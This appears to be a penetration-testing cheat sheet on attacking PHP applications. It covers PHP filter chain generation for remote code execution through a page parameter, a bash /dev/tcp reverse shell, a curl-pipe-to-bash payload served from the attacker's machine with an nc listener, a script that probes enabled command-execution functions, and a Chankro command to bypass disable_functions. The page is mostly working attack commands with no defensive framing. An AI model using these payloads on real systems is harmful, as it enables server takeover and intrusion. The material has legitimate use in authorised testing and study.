# PHP

## PHP Filters Chain <a href="#php-filters-chain" id="php-filters-chain"></a>

### Exploitation <a href="#exploitation" id="exploitation"></a>

[PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) is available so we can use it.

```shellscript
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
```

We only have to do is paste the above generated payload to **`/?page=<genrated_chain>`**.

#### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

First create a shell script named **"revshell"** in local machine.

```shellscript
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

Then create a chain using a generator.\
Replace the ip address with your own.

```shellscript
# `<?= ?>` is a shorthand for `<?php echo ~ ?>`
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/revshell|bash` ?>'
```

We need to start a web server that hosts the shell script, and also start a listener for receiving the reverse connection.

```shellscript
# terminal 1
sudo python3 -m http.server 80

# terminal 2
nc -lvnp 4444
```

Now access to **`/?page=<generated_chain>`**. We can get a shell.

### References <a href="#references" id="references"></a>

* [Synacktiv](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)

## RCE Function Check

If you can execute PHP on a target but want to figure out which functions are available to you to execute commands on the host, you can use this script.

Link to gist: [https://gist.github.com/AppSecExplained/aab510eead65c9c95aa20a69d89c9d2a](https://gist.github.com/AppSecExplained/aab510eead65c9c95aa20a69d89c9d2a)

```shellscript
<?php

$test_command = 'echo "time for some fun!"';
$functions_to_test = [
    'system',
    'shell_exec',
    'exec',
    'passthru',
    'popen',
    'proc_open',
];

function test_function($func_name, $test_command) {
    if (function_exists($func_name)) {
        try {
            $output = @$func_name($test_command);
            if ($output) {
                echo "Function '{$func_name}' enabled and executed the test command.\n";
            } else {
                echo "Function '{$func_name}' enabled, but failed to execute the test command.\n";
            }
        } catch (Throwable $e) {
            echo "Function '{$func_name}' enabled, but an error occurred: {$e->getMessage()}\n";
        }
    } else {
        echo "Function '{$func_name}' disabled or not available.\n";
    }
}

foreach ($functions_to_test as $func) {
    test_function($func, $test_command);
} ?>
```

*

{% embed url="https://github.com/TarlogicSecurity/Chankro" %}

*   Bypass disable\_functions and open\_basedir

    ```bash
    python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
    ```
* Unserialize PHP Payload generator\
  https://github.com/ambionics/phpggc
* Backup Artifacts<br>

{% embed url="https://github.com/mazen160/bfac" %}

```bash
bfac --url http://example.com/test.php
```
